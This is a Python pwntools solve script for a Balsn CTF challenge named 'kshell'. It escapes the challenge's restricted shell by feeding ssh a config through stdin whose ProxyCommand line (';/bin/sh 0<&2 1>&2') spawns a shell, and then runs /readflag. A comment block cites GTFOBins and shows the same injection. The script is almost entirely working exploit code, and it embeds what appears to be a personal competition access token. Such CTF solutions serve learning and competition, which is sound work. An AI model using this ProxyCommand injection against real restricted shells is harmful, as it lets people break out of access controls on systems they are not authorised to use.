# https://gtfobins.github.io/gtfobins/ssh/

"""
kshell~$ ssh -F /proc/self/fd/2 localhost

ssh -F <(echo "hoge") localhost
Host localhost
    ProxyCommand ;sh 0<&2 1>&2
"""
from pwn import *

io = remote("kshell.balsnctf.com", "7122")

io.recvuntil(b"Your access_token:")
io.sendline(b"ctfd_ddc15718377451eda61f0ba71a451c0ef2c43b991b80fa50df04200995500ef2")
io.recvuntil(b"kshell~$")
io.sendline(b"help")
io.sendline(b"ssh -F /dev/stdin x")
io.sendline(b"Host x")
io.sendline(b"    ProxyCommand ;/bin/sh 0<&2 1>&2")
io.sendline(b"\x04")
io.sendline(b"/readflag")
while True:
    print(io.recvline())
io.interactive()
io.close()

# io.send(pwnlib.tubes.eof)
